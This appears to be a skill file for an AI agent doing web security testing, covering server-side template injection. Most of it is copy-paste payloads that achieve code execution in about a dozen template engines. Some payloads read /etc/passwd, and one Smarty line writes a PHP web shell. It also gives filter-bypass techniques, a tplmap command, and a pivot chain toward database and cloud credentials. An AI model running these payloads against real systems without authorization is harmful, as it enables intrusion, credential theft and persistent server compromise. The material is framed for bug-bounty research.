# SKILL: Server-Side Template Injection (SSTI — Jinja2/Twig/Freemarker/Velocity/Smarty/ERB/Razor/Handlebars/Pug)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (server-side template injection (ssti — jinja2/twig/freemarker/velocity/smarty/erb/razor/handlebars/pug)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
SSTI in template engines == RCE. I detect via behavioral diff (`{{7*7}}` → 49) then fingerprint engine, then RCE.

---

## DETECTION
Inject across all output sinks (404 pages, error pages, email subject, bio, name, search). Test:
```
${7*7}      → Freemarker, Velocity → 49
{{7*7}}     → Jinja2, Twig, Pug    → 49
<%= 7*7 %>  → ERB, EJS              → 49
{{7*'7'}}   → Twig: 49 / Jinja2: 7777777
{{7*7}}{{7*'7'}}  → engine fingerprinter
```


## EXPLOITATION
### Jinja2 (Python)
```
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]("id",shell=True,stdout=-1).communicate()[0]}}   # find subprocess.Popen index
```

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{['/etc/passwd']|map('file_get_contents')|first}}
```

### Freemarker (Java)
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("freemarker.template.utility.Execute")("id")}
```

### Velocity (Java)
```
#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Smarty (PHP)
```
{php}system('id');{/php}                   # if {php} tags enabled
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']);?>",self::clearConfig())}
```

### ERB (Ruby)
```
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
<%= File.open('/etc/passwd').read %>
```

### Handlebars (Node)
```
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

### Pug / Jade (Node)
```
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
= x
#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

### Razor (.NET)
```
@(1+2)
@{System.Diagnostics.Process.Start("cmd.exe","/c id");}
@{var x = System.IO.File.ReadAllText("C:\\windows\\win.ini");}
```

### Mako (Python)
```
${self.module.cache.util.os.popen('id').read()}
<%import os%>${os.popen('id').read()}
```

### Tornado (Python)
```
{% import os %}{{os.popen('id').read()}}
```

## PAYLOADS (real, copy-paste, grouped)
(See exploitation section — engine-specific payloads above)

## BYPASS TECHNIQUES
- Block lists for `__class__`, `__bases__` → use `attr` filter / dict access: `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}`.
- Strip `()` → `request|attr('class')|attr('mro')|attr('1')`.
- Strip dots → `[]` indexing.
- Strip quotes → `request|attr(request.args.attr)` with `?attr=__class__`.

## CHAIN POTENTIAL
SSTI → RCE → environment variables / config DB creds → DB ATO → cloud creds (env var leak) → S3 / RDS pivot.

## TOOLS
tplmap (auto), Burp Backslash Powered Scanner, manual diff

## COMMANDS
```bash
# tplmap (clone https://github.com/epinna/tplmap)
python3 tplmap.py -u 'https://target/?name=John' --os-cmd id

# Test all engines via nuclei
nuclei -l urls.txt -t 'http/cves/' -tags ssti
```

## EDGE CASES / NOT-A-BUG TRAPS
Sandbox engines (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment) — RCE escapes are CVE-tracked; reference latest.

## TRIAGE ANGLE (per platform)
Always show full RCE PoC (`id`, `hostname`, `whoami`). Triage will accept lower if sandbox proven hard.

## SEVERITY & CVSS
9.8 typical (RCE).

## REFERENCES
PortSwigger SSTI Cheat Sheet • PayloadsAllTheThings/Server Side Template Injection • HackTricks SSTI
